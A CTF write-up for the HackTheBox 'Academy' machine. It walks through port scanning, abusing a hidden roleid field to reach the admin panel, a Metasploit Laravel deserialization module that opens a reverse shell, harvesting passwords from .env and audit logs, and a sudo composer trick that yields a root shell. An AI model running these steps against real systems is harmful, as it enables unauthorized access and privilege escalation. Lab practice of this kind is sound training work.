## Academy [HackTheBox]
> Mayank Srivastava | 10 Jan 2021 11:57 PM

A Simple WriteUp for HackTheBox machine.
```
Mahine Name : Academy
OS          : Linux
Difficulty  : Easy (But i rated as Medium)
IP Address  : 10.10.10.215
```

## Port Scanning

As usual running nmap against the webserver and found some open ports

```
# Nmap 7.91 scan initiated Sun Jan 10 22:50:59 2021 as: nmap -sC -sV -oN nmap/initial 10.10.10.215
Nmap scan report for 10.10.10.215
Host is up (0.27s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)
|   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)
|_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://academy.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 10 22:52:09 2021 -- 1 IP address (1 host up) scanned in 70.47 seconds
```

Add ``` academy.htb ``` to ``` /etc/hosts ```


## Web Reconnaissance

So Let’s first enumerate port 80. start a gobuster scan and got something useful.

found three intersting php pages.

```
index.php
register.php
admin.php
```
First get register on the platform. After getting register page automatically
redirect to ```login.php```, nothing intersting found on the login.php
but checking in the source code of the web page ``` register.php ```
found a ```hidden html input element``` which is set to ```roleid=0```.
intercepting with burpsuite changed ```roleid=1``` and again redirect to ```login.php ```
But at this time repeated the same process but instead of going to ```login.php```
decided to open ```admin.php``` and login with registered credentials and got
a Foothold. After login with credentials seen a new sub-domain on the page.
so added to ```dev-staging-01.academy.htb --> /etc/hosts```.

Looking around the pages i think this Laravel framework  and with the page
information like APP_NAME="Laravel" and APP_KEY="**********" got confirmation
that Laravel framework.

Searching in the ```exploitdb``` and found the version of Laravel is vulnerable
to ```object deserialization and command execution``` and also find a metasploit
module ``` exploit(unix/http/laravel_token_unserialize_exec) ```.

## Steps to exploit
```
msfconsole
use exploits/unix/http/laravel_token_unserialize_exec
set RHOST <rhost>
set RPORT <rport>
set APP_KEY <base64_string>
set VHOSTS <add sub-domain.academy.htb>
set LHOST <your_local_htb_address>
set LPORT 4444
exploit
```

## Horizontal Privilege Escalation

Listing the Home directory we can see lots of users. There are two mentions
users ```cry0l1t3``` and ```mr3bn```. we have to escalate our privilege
horizontally to user ```cry0l1t3```. Search for Laravel import files like ```.env```
All the environment variables are declared in the ```.env``` file which includes
the parameters required for initializing the configuration, so we have advantage
to get the password of user and fortunately we got one. we can cat ```user.txt```
located in ```/home```.

user ```cry0l1t3``` is not sudoers lists but we have another user ```mr3bn```
let's find ``` mr3bn``` user password, after searching the files and seen the
user is in the ```adm```, move to ```/var/log/audit``` and search for the mr3bn
credentials, and found credentials in hex format decrypt it and switch user ```mr3bn```

## Vertical Privilege Escalation

…and check what sudo privilege ```mr3bn``` has

the user ```mr3bn``` run ```(ALL) /usr/bin/composer``` composer have SUID bit
permission we can following command as user to get root shell.
```
TF=$(mktemp -d)
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
sudo composer --working-dir=$TF run-script x
```
Now we have ROOT shell. grab the root.txt submit on HackTheBox.
